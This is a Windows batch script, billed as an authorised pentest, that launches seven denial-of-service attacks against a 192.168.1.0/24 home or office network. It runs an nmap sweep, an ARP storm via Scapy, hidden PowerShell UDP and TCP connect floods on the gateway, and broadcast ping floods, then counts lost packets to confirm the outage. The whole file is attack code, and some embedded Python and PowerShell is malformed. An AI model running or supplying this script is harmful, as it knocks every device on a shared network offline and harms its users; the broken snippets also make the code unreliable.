@echo off
title 192.168.1.0/24 TOTAL ANNIHILATION
color 0C
mode con cols=80 lines=30

echo =================================================================
echo 💀 192.168.1.0/24 NETWORK TOTAL KILLER - AUTHORIZED PENTEST
echo =================================================================
echo Gateway Target: 192.168.1.1
echo Your Position:  192.168.1.172  
echo Subnet Target:  192.168.1.0/24
echo Broadcast:      192.168.1.255
echo =================================================================
echo [1/7] Scanning live hosts...
nmap -sn 192.168.1.0/24 -T4 --reason | findstr "Nmap scan report" > targets.txt
echo    Found: %~dp0targets.txt

echo [2/7] Enabling IP forwarding...
netsh interface ipv4 set interface "Ethernet" forwarding=enabled >nul 2>&1

echo [3/7] ARP Storm (Python Scapy)...
(
echo from scapy.all import *^& import time
echo conf.iface="Ethernet"
echo send^(ARP^(pdst="192.168.1.0/24", psrc="0.0.0.0", hwsrc="ff:ff:ff:ff:ff:ff"^)^, inter=0.01, loop=1^)^
) > arp_storm.py & start /min python arp_storm.py

echo [4/7] Gateway UDP Flood (PowerShell)...
powershell -w hidden -c "
$c=New-Object System.Net.Sockets.UdpClient;
while^($true^){$c.Send^([byte[]]^((1..1400^)^),1400,'192.168.1.1',53^)}
" > udp_flood.ps1 & start /min powershell -w hidden -f udp_flood.ps1

echo [5/7] Broadcast Ping Storm...
start /min cmd /c "ping -t -l 65000 192.168.1.255"

echo [6/7] Broadcast Ping Hell 2...
start /min cmd /c "ping -t -l 65000 255.255.255.255"

echo [7/7] SYN Flood Gateway...
powershell -w hidden -c "
while^($true^){$t=New-Object System.Net.Sockets.TcpClient; try^ {$t.Connect^('192.168.1.1',80^)^}catch^ {};$t.Close^()}
" > syn_flood.ps1 & start /min powershell -w hidden -f syn_flood.ps1

echo.
echo 🔥🔥 ALL 7 ATTACKS LIVE - NETWORK IS FUCKED 🔥🔥
echo.
echo 📊 Live Status Tests:
echo Test 1: ping 192.168.1.1 -t ^<-- Should show 100%% loss
echo Test 2: Check targets.txt for live hosts count  
echo.
echo 🛑 STOP ALL: Task Manager ^> Kill python.exe, powershell.exe, cmd.exe processes
echo.
ping 192.168.1.1 -n 1000 | findstr "Request timed out" | find /c /v "" > loss_count.txt
echo Loss so far: %errorlevel% / 1000 packets
timeout /t 3 >nul & ping 192.168.1.1 -n 10
pause